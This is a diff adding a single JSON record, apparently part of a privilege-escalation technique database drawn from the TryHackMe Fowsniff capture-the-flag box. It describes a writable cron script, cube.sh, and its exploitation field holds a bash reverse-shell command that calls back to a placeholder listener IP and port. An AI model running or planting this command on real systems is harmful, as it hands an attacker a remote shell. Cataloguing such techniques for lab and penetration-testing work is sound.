@@ -1,0 +1,1 @@
+{"id":"writable_cron_cube","category":"WRITABLE_CRON","binary":"cube.sh","cve":null,"exploitation":["echo 'bash -i >& /dev/tcp/{{listener_ip}}/{{listener_port}} 0>&1' >> {{binary}}"],"source":"tryhackme/Fowsniff CTF","tags":["cron","writable","ctf"],"severity":"high"}
